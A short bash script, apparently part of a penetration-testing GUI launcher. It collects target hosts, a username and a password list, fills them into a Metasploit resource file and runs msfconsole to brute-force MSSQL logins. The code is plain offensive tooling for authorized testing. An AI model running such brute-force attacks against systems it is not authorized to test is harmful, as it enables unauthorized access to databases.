#!/bin/bash

: '
mssql: bruteforce username and passwords file
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
RHOSTS_FIELD=$(form_item  "RHOSTS" "RHOSTS")
USERNAME_FIELD=$(form_item  "USERNAME" "USERNAME")
PASS_FILE_FIELD=$(form_item  "PASS_FILE" "PASS_FILE")

# Generate GUI form
generate_form "${RHOSTS_FIELD}" "${USERNAME_FIELD}" "${PASS_FILE_FIELD}"

RHOSTS=${form_data["RHOSTS"]}
USERNAME=${form_data["USERNAME"]}
PASS_FILE=${form_data["PASS_FILE"]}

FILES_FOLDER="${SCRIPTS_DIR}/sqlDatabase/mssql/.files"

# Define replacement fields
REPLACE_FIELDS=(
    "[USERNAME]" "${USERNAME}"
    "[PASS_FILE]" "${PASS_FILE}"
    "[RHOSTS]" "${RHOSTS}"
)

find_and_replace_file "${FILES_FOLDER}" "msfconsole_brute_force_mssql_username_pass_file.rc" "${REPLACE_FIELDS[@]}"

paste_command "msfconsole -r ${TMP_FILE}"
xdotool key Return
